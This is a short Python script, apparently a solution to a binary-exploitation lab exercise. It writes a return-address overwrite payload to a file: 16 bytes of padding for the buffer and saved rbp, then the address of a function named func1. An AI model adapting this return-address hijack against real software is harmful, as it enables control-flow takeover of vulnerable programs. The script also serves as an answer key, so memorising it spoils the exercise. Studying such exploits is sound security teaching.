#8字节buffer + 8字节saved rbp 
padding = b"A" * 16

#func1 的入口地址 0x401216
func1_address = b"\x16\x12\x40\x00\x00\x00\x00\x00"

payload = padding + func1_address

# 写入文件
with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Payload written to ans1.txt")